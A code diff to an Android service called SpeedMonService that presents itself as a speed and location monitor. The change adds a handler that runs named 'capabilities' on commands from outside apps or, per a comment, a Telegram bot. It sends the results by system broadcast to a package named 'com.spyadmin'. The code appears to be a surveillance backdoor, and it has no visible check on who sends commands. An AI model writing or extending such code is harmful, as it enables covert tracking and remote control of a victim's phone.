@@ -91,9 +91,41 @@ class SpeedMonService : Service() {
             stopSelf()
             return START_NOT_STICKY
         }
+        
+        // Handle explicit command intents (from telegram bot or other apps)
+        if (intent?.action == ACTION_COMMAND) {
+            handleCommandIntent(intent)
+            // Don't stop the service, just handle the command
+            return START_STICKY
+        }
+        
         startForeground(NOTIFICATION_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
         startLocationUpdates()
         return START_STICKY
+    }
+
+    private fun handleCommandIntent(intent: Intent) {
+        val capability = intent.getStringExtra(EXTRA_CAPABILITY) ?: return
+        val argsJson = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
+        val taskId = intent.getStringExtra(EXTRA_TASK_ID) ?: java.util.UUID.randomUUID().toString()
+
+        val capabilityImpl = capabilities[capability] ?: run {
+            sendResult(taskId, null, "Unknown capability: $capability", "failed")
+            return
+        }
+
+        thread(name = "speedmon-task-$taskId") {
+            var output: Any? = null
+            var error: String? = null
+            var status = "completed"
+            try {
+                output = capabilityImpl.execute(argsJson)
+            } catch (e: Exception) {
+                error = e.message
+                status = "failed"
+            }
+            sendResult(taskId, output, error, status)
+        }
     }
 
     private fun createNotificationChannel() {
@@ -210,8 +242,9 @@ class SpeedMonService : Service() {
             putExtra(EXTRA_RESULT, result?.toString() ?: "")
             putExtra(EXTRA_ERROR, error ?: "")
             putExtra(EXTRA_STATUS, status)
+            setPackage("com.spyadmin") // Send specifically to admin app
         }
-        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
+        sendBroadcast(intent)
     }
 
     private inner class CommandReceiver : BroadcastReceiver() {
